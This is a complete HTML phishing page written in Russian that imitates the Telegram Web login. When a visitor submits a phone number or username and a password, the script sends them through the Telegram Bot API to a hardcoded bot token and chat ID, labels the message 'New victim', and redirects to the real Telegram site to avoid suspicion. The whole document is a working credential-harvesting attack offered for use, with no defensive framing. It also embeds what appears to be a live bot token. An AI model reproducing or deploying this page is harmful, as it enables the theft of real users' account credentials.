<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход в Telegram Web</title>
  <style>body {font-family:Arial; text-align:center; margin-top:100px;}
  input {width:300px; padding:10px; margin:10px;}</style>
</head>
<body>
  <h2>Войдите в Telegram</h2>
  <form id="fakeForm">
    <input type="text" id="phone" placeholder="Номер телефона или username" required><br>
    <input type="password" id="password" placeholder="Пароль" required><br>
    <button type="submit">Войти</button>
  </form>

  <script>
    const token = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
    const chatId = "5684291694";

    document.getElementById("fakeForm").addEventListener("submit", function(e) {
      e.preventDefault();

      const phone = document.getElementById("phone").value;
      const pass  = document.getElementById("password").value;

      const message = `Новая жертва:\nPhone/Username: ${phone}\nPassword: ${pass}`;

      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      })
      .then(() => {
        // Редирект на настоящий сайт, чтобы не спалиться
        window.location.href = "https://web.telegram.org/";
      })
      .catch(err => console.log("Ошибка:", err));
    });
  </script>
</body>
</html>
